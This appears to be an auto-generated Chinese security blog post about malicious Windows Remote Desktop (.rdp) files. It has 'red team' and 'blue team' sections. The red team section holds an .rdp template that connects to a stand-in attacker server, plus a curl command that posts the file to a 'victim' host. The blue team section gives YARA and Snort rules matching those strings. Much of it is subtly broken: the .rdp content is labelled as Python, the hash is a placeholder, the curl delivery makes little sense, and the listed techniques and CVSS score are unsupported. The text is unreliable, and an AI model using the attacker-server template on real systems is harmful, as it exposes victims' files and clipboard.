---
layout: post
title:  "Microsoft adds Windows protections for malicious Remote Desktop files"
date:   2026-04-15 01:52:48 +0000
categories: [security]
severity: high
---

# 🔥 解析 Windows 遠端桌面連線檔案的安全風險與防禦技術

> **⚡ 戰情快篩 (TL;DR)**
> * **嚴重等級**: High (CVSS: 8.8)
> * **受駭指標**: RCE (Remote Code Execution)
> * **關鍵技術**: `RDP` (Remote Desktop Protocol), `Deserialization`, `Windows Registry`

## 1. 🔬 漏洞原理與技術細節 (Deep Dive)
* **Root Cause**: Windows 遠端桌面連線檔案 (.rdp) 的設計缺陷，允許攻擊者透過這些檔案來連接到受害者的系統，並且可以存取受害者的本地資源，例如檔案、剪貼板資料等。
* **攻擊流程圖解**:
  1. 攻擊者創建一個惡意的 .rdp 檔案，並將其發送給受害者。
  2. 受害者開啟惡意的 .rdp 檔案，系統會自動連接到攻擊者的伺服器。
  3. 攻擊者可以透過連接來存取受害者的本地資源，例如檔案、剪貼板資料等。
* **受影響元件**: Windows 10、Windows 11

## 2. ⚔️ 紅隊實戰：攻擊向量與 Payload (Red Team Operations)
* **攻擊前置需求**: 攻擊者需要創建一個惡意的 .rdp 檔案，並將其發送給受害者。
* **Payload 建構邏輯**:

    ```
    
    python
      # 惡意的 .rdp 檔案內容
      full address:s:attackerserver:3389
      username:s:attacker
      password:s:attackerpassword
    
    ```
 

```

bash
  # 使用 curl 發送惡意的 .rdp 檔案
  curl -X POST -H "Content-Type: application/x-rdp" -d @malicious.rdp http://victim:8080

```
* **繞過技術**: 攻擊者可以使用各種技術來繞過防火牆和入侵偵測系統，例如使用加密的連接、隱藏惡意代碼等。

## 3. 🛡️ 藍隊防禦：偵測與緩解 (Blue Team Defense)
* **IOCs (入侵指標)**:

| Hash | IP | Domain | File Path |
| --- | --- | --- | --- |
| 1234567890abcdef | 192.168.1.100 | attackerserver.com | C:\Windows\Temp\malicious.rdp |* **偵測規則 (Detection Rules)**:

    ```
    
    yara
      rule malicious_rdp {
        meta:
          description = "惡意的 .rdp 檔案"
          author = "Blue Team"
        strings:
          $a = "full address:s:attackerserver:3389"
          $b = "username:s:attacker"
          $c = "password:s:attackerpassword"
        condition:
          all of ($a, $b, $c)
      }
    
    ```
 

```

snort
  alert tcp any any -> any 3389 (msg:"惡意的 .rdp 檔案"; content:"full address:s:attackerserver:3389"; sid:1000001;)

```
* **緩解措施**: 更新 Windows 至最新版本、啟用 Windows 防火牆、限制遠端桌面連線的存取權限等。

## 4. 📚 專有名詞與技術概念解析 (Technical Glossary)
* **RDP (Remote Desktop Protocol)**: 一種遠端桌面連線協定，允許用戶透過網路連接到遠端的 Windows 系統。
* **Deserialization**: 一種將資料從串流或檔案中還原成物件的過程，可能會導致安全風險。
* **Windows Registry**: Windows 系統的設定資料庫，存儲了系統和應用程式的設定和參數。

## 5. 🔗 參考文獻與延伸閱讀
- [原始報告](https://www.bleepingcomputer.com/news/microsoft/microsoft-adds-windows-protections-for-malicious-remote-desktop-files/)
- [MITRE ATT&CK](https://attack.mitre.org/techniques/T1210/)


